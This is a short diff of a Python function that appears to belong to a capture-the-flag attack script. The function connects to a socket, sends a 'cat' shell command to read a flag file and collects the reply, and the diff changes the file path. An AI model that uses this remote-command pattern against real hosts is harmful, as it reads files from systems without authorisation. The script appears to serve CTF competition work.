@@ -50,7 +50,7 @@ def createSocket():
         conn.settimeout(5)
         flagbuff = conn.recv(1024)
         log.debug(flagbuff)
-        conn.send('cat /var/www/flag')
+        conn.send('cat /tmp/flag')
         conn.send('\n')
         time.sleep(1)
         flags = conn.recv(1024)
